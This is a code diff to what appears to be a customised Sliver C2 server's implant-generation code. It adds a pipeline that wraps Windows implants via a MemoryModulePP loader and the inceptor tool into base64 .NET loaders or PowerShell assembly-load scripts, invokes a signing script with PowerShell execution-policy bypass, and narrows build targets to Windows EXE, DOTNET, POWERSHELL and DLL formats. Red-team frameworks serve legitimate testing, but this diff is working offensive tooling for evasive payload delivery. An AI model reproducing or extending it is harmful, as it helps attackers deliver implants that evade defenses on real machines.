@@ -134,6 +134,10 @@ const (
 	SliverPlatformCXX32EnvVar = "SLIVER_%s_CXX_32"
 )
 
+type resourceTemp struct {
+	Inputpath string
+}
+
 // ImplantConfigFromProtobuf - Create a native config struct from Protobuf
 func ImplantConfigFromProtobuf(pbConfig *clientpb.ImplantConfig) (string, *models.ImplantConfig) {
 	cfg := &models.ImplantConfig{}
@@ -189,6 +193,13 @@ func ImplantConfigFromProtobuf(pbConfig *clientpb.ImplantConfig) (string, *model
 		})
 	}
 
+	// cfg.Transformations = []models.Transformation{}
+	// for _, pbTransform := range pbConfig.Transformations {
+	// 	cfg.Transformations = append(cfg.Transformations, models.Transformation{
+	// 		Command: pbTransform,
+	// 	})
+	// }
+
 	// Copy C2
 	cfg.C2 = copyC2List(pbConfig.C2)
 	cfg.MTLSc2Enabled = isC2Enabled([]string{"mtls"}, cfg.C2)
@@ -226,6 +237,107 @@ func copyC2List(src []*clientpb.ImplantC2) []models.ImplantC2 {
 		})
 	}
 	return c2s
+}
+
+// func convert(string_array []string, index int, start int, end int, bytes []byte) {
+// 	out := ""
+
+// 	for i := start; i < end; i++ {
+// 		out += fmt.Sprintf("%d, ", bytes[i])
+// 	}
+// 	string_array[index] = out
+// }
+
+// // bytesToCString
+// func bytesToCString(bytes []byte) string {
+// 	n_routines := 20
+// 	bytes_to_handle := len(bytes) / n_routines
+// 	i := 0
+// 	var wg sync.WaitGroup
+// 	string_array := []string{}
+// 	for i < n_routines {
+// 		wg.Add(1)
+// 		if i == n_routines-1 {
+// 			start := i * bytes_to_handle
+// 			end := len(bytes)
+// 			go convert(string_array, i, start, end, bytes)
+// 		} else {
+// 			start := i * bytes_to_handle
+// 			end := (i + 1) * bytes_to_handle
+// 			go convert(string_array, i, start, end, bytes)
+// 		}
+// 		i++
+// 	}
+// 	wg.Wait()
+// 	out := "{"
+// 	for _, s := range string_array {
+// 		out += s
+// 	}
+// 	return strings.TrimSuffix(out, ", ") + "}"
+// }
+
+// convertToLoadable
+func convertToLoadable(filepath string) string {
+	// content, _ := os.ReadFile("C:\\temp\\MemoryModulePP\\test\\resource.rc.tmpl.txt")
+	// text := string(content)
+
+	// out, _ := exec.Command("python.exe", "C:\\temp\\MemoryModulePP\\convertToBuf.py", filepath).Output()
+	// outstring := string(out)
+
+	// inputpath := strings.ReplaceAll(filepath, "\\", "\\\\")
+	// tmpl, _ := template.New("buf").Parse(text)
+	// data_templ := resourceTemp{
+	// 	Inputpath: inputpath,
+	// }
+	// f, _ := os.Create("C:\\temp\\MemoryModulePP\\test\\Resource.rc")
+	// buf := bytes.NewBuffer([]byte{})
+	// tmpl.Execute(buf, data_templ)
+	// f.Write(buf.Bytes())
+	// f.Close()
+	command := fmt.Sprintf("cd C:\\temp\\MemoryModulePP\\ && build_loader.bat %s", filepath)
+	out, _ := exec.Command("cmd.exe", "/c", command).Output()
+	outstring := string(out)
+	fmt.Println(outstring)
+	re := regexp.MustCompile(`test.vcxproj -> (.*)`)
+	//re2 := regexp.MustCompile(`Linking CXX shared library (.*)`)
+	matches := re.FindAllStringSubmatch(outstring, -1)
+	out_file := strings.Trim(strings.Replace(matches[0][1], "/", "\\", -1), "\r\n")
+	return out_file
+}
+
+func convertToAssembly(in string) string {
+	outfile := "C:\\temp\\a.exe"
+	command := fmt.Sprintf("cd C:\\temp\\inceptor\\inceptor; .\\venv\\Scripts\\activate.ps1; cd inceptor; python.exe .\\inceptor.py dotnet -t loader -e base64 -o %s %s", outfile, in)
+	out, _ := exec.Command("powershell.exe", "-c", command).Output()
+	outstring := string(out)
+	println(outstring)
+	return outfile
+}
+
+// command for thread execution: powershell -t pe2sh -o C:\temp\b.ps1 -e xor -e base64 C:\temp\MemoryModulePP\x64\Release\loader.raw
+func convertToPowershell(in string) string {
+	outfile := "C:\\temp\\a.ps1"
+	command := fmt.Sprintf("powershell.exe -c cd C:\\temp\\inceptor\\inceptor; .\\venv\\Scripts\\activate.ps1; cd inceptor; python.exe .\\inceptor.py  powershell  -o %s -t loader -T .\\templates\\public\\powershell\\code_execution\\assembly_load.ps1 %s", outfile, in)
+	out, _ := exec.Command("powershell.exe", "-c", command).Output()
+	outstring := string(out)
+	println(outstring)
+	return outfile
+}
+
+// ApplyTransform
+func ApplyTransform(transform string, filepath string) string {
+	out := ""
+	if transform == "powershell" {
+		loader := convertToLoadable(filepath)
+		asm := convertToAssembly(loader)
+		psh := convertToPowershell(asm)
+		out = psh
+	} else if transform == "dotnet" {
+		loader := convertToLoadable(filepath)
+		asm := convertToAssembly(loader)
+		out = asm
+	}
+	return out
 }
 
 func isC2Enabled(schemes []string, c2s []models.ImplantC2) bool {
@@ -380,6 +492,12 @@ func SliverSharedLibrary(name string, otpSecret string, config *models.ImplantCo
 	command = fmt.Sprintf("cd %sSliver-CPPImplant2-asset\\; Import-Module .\\sign.ps1; invoke-sign %s", pkgPath, dest)
 	out, err = exec.Command("powershell.exe", "-ep", "bypass", "-c", command).Output()
 	outstring = string(out)
+
+	if config.Format == clientpb.OutputFormat_POWERSHELL {
+		dest = ApplyTransform("powershell", dest)
+	} else if config.Format == clientpb.OutputFormat_DOTNET {
+		dest = ApplyTransform("dotnet", dest)
+	}
 	if save {
 		err = ImplantBuildSave(name, config, dest)
 		if err != nil {
@@ -468,6 +586,7 @@ func SliverExecutable(name string, otpSecret string, config *models.ImplantConfi
 	out, err = exec.Command("powershell.exe", "-ep", "bypass", "-c", command).Output()
 	outstring = string(out)
 	config.FileName = filepath.Base(dest)
+
 	if save {
 		err = ImplantBuildSave(name, config, dest)
 		if err != nil {
@@ -840,45 +959,68 @@ func GetCompilerTargets() []*clientpb.CompilerTarget {
 	targets := []*clientpb.CompilerTarget{}
 
 	// EXE - Any server should be able to target EXEs of each platform
-	for longPlatform := range SupportedCompilerTargets {
-		platform := strings.SplitN(longPlatform, "/", 2)
-		targets = append(targets, &clientpb.CompilerTarget{
-			GOOS:   platform[0],
-			GOARCH: platform[1],
-			Format: clientpb.OutputFormat_EXECUTABLE,
-		})
-	}
-
+	// for longPlatform := range SupportedCompilerTargets {
+	// 	platform := strings.SplitN(longPlatform, "/", 2)
+	// 	targets = append(targets, &clientpb.CompilerTarget{
+	// 		GOOS:   platform[0],
+	// 		GOARCH: platform[1],
+	// 		Format: clientpb.OutputFormat_EXECUTABLE,
+	// 	})
+	// }
+	// EXE
+	targets = append(targets, &clientpb.CompilerTarget{
+		GOOS:   "windows",
+		GOARCH: "amd64",
+		Format: clientpb.OutputFormat_EXECUTABLE,
+	})
+	//DOTNET
+	targets = append(targets, &clientpb.CompilerTarget{
+		GOOS:   "windows",
+		GOARCH: "amd64",
+		Format: clientpb.OutputFormat_DOTNET,
+	})
+	//POWERSHELL
+	targets = append(targets, &clientpb.CompilerTarget{
+		GOOS:   "windows",
+		GOARCH: "amd64",
+		Format: clientpb.OutputFormat_POWERSHELL,
+	})
+	// SHARED_LIB
+	targets = append(targets, &clientpb.CompilerTarget{
+		GOOS:   "windows",
+		GOARCH: "amd64",
+		Format: clientpb.OutputFormat_SHARED_LIB,
+	})
 	// SHARED_LIB - Determine if we can probably build a dll/dylib/so
-	for longPlatform := range SupportedCompilerTargets {
-		platform := strings.SplitN(longPlatform, "/", 2)
+	// for longPlatform := range SupportedCompilerTargets {
+	// 	platform := strings.SplitN(longPlatform, "/", 2)
 
-		// We can always build our own platform
-		if runtime.GOOS == platform[0] {
-			targets = append(targets, &clientpb.CompilerTarget{
-				GOOS:   platform[0],
-				GOARCH: platform[1],
-				Format: clientpb.OutputFormat_SHARED_LIB,
-			})
-			continue
-		}
+	// 	// We can always build our own platform
+	// 	if runtime.GOOS == platform[0] {
+	// 		targets = append(targets, &clientpb.CompilerTarget{
+	// 			GOOS:   platform[0],
+	// 			GOARCH: platform[1],
+	// 			Format: clientpb.OutputFormat_SHARED_LIB,
+	// 		})
+	// 		continue
+	// 	}
 
-		// Cross-compile with the right configuration
-		if runtime.GOOS == LINUX || runtime.GOOS == DARWIN {
-			cc, _ := findCrossCompilers(platform[0], platform[1])
-			if cc != "" {
-				if runtime.GOOS == DARWIN && platform[0] == LINUX && platform[1] == "386" {
-					continue // Darwin can't target 32-bit Linux, even with a cc/cxx
-				}
-				targets = append(targets, &clientpb.CompilerTarget{
-					GOOS:   platform[0],
-					GOARCH: platform[1],
-					Format: clientpb.OutputFormat_SHARED_LIB,
-				})
-			}
-		}
+	// 	// Cross-compile with the right configuration
+	// 	if runtime.GOOS == LINUX || runtime.GOOS == DARWIN {
+	// 		cc, _ := findCrossCompilers(platform[0], platform[1])
+	// 		if cc != "" {
+	// 			if runtime.GOOS == DARWIN && platform[0] == LINUX && platform[1] == "386" {
+	// 				continue // Darwin can't target 32-bit Linux, even with a cc/cxx
+	// 			}
+	// 			targets = append(targets, &clientpb.CompilerTarget{
+	// 				GOOS:   platform[0],
+	// 				GOARCH: platform[1],
+	// 				Format: clientpb.OutputFormat_SHARED_LIB,
+	// 			})
+	// 		}
+	// 	}
 
-	}
+	// }
 
 	// SERVICE - Can generate service executables for Windows targets only
 	for longPlatform := range SupportedCompilerTargets {
